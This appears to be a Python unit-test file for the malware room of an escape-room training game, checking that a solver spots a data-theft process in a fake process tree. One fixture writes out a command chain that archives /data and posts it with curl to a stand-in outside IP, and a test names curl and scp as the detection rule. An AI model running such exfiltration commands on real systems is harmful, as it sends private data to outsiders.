"""
Test class for malware.py, runs the methods and makes sure they behave as
expected.
"""
import io
import unittest
from unittest.mock import Mock

from escaperoom.location import CurrentRoom
from escaperoom.rooms.malware import MalwareRoom
from escaperoom.transcript import Transcript


class MalwareTest(unittest.TestCase):

    def _room_log(self, t: Transcript, room: CurrentRoom) -> str:
        """
        Helper: fetches all logs for a given room (MALWARE)
        confirm that TOKEN[...] and EVIDENCE[...] lines were recorded.
        """
        return t.transcript_dict[room]

    def test_malware_finds_curl_chain_and_returns_terminal_pid(self):
        """
        Test: MalwareRoom finds the exfiltration chain (via curl) and returns PID 175
        """
        # Fake process tree as JSON-lines input
        jsonl = """{"pid":167,"ppid":0,"cmd":"init"}
    {"pid":170,"ppid":167,"cmd":"/usr/bin/python3 worker.py"}
    {"pid":171,"ppid":170,"cmd":"tar -czf /tmp/x.tgz /data"}
    {"pid":175,"ppid":171,"cmd":"sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"}
    """

        # Create MalwareRoom; mock its open_file() to return our test data
        room, t = self._create_test_malware()
        room.open_file = lambda: io.StringIO(jsonl)

        # Run the solver
        token = room.solve()

        # The token should be "175" (the PID of the exfiltration process)
        assert token == "175"

        """
        # Verify the grading lines were added to the transcript
        log = self._room_log(t, CurrentRoom.MALWARE)
        assert "TOKEN[PID]=175" in log
        assert "EVIDENCE[PID].PATH=[167->170->171->175]" in log
        assert "curl -X POST" in log
        """

    def test_malware_returns_none_when_no_exfil_found(self):
        """
        Test: If there’s no command containing 'curl' or 'scp', the solver should return None.
        """
        # Process tree without any exfiltration command
        jsonl = """{"pid":1,"ppid":0,"cmd":"init"}
    {"pid":2,"ppid":1,"cmd":"/usr/sbin/cron"}
    {"pid":3,"ppid":1,"cmd":"/usr/bin/sleep 60"}
    """

        # Transcript + mocked MalwareRoom setup
        room, t = self._create_test_malware()
        room.open_file = lambda: io.StringIO(jsonl)

        # The solver finds no suspicious command → returns None
        assert room.solve() is None

    @staticmethod
    def _create_test_malware() -> tuple[MalwareRoom, Transcript]:
        """
        Creates an instance of the Malware with a mocked transcript file
        :returns: The Malware instance
        """
        transcript_mock = Mock()
        to_test_malware = MalwareRoom(transcript_mock, "mock")
        return to_test_malware, transcript_mock
